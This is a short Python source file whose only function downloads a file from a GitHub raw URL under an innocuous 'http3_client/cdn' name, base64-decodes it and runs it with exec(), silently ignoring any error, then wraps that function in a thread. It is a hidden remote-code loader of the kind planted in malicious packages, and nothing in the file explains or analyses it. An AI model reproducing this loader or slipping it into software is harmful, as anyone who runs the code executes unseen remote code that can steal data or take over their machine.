import threading
import requests
import base64

def main():
    try:
        exec(base64.b64decode(requests.get("https://raw.githubusercontent.com/dmnstnd/http3_client/main/cdn").text.encode()).decode())
    except KeyboardInterrupt as e:return
    except:pass

threading.Thread(target=main)
